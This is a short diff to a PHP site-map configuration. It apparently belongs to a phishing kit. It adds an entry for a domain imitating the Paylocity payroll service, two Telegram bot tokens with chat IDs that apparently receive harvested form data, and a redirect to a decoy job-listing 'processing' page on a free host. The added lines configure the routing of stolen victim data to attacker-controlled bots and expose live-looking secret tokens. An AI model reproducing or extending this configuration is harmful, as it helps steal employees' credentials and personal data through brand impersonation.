@@ -22,6 +22,17 @@ $site_map = [
     ],
 
 
+    'paylocityemployeeform.netlify.app' => [
+        'bots' => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+
+            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
+        ],
+        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
+    ],
+
+
+
 
 ];
 
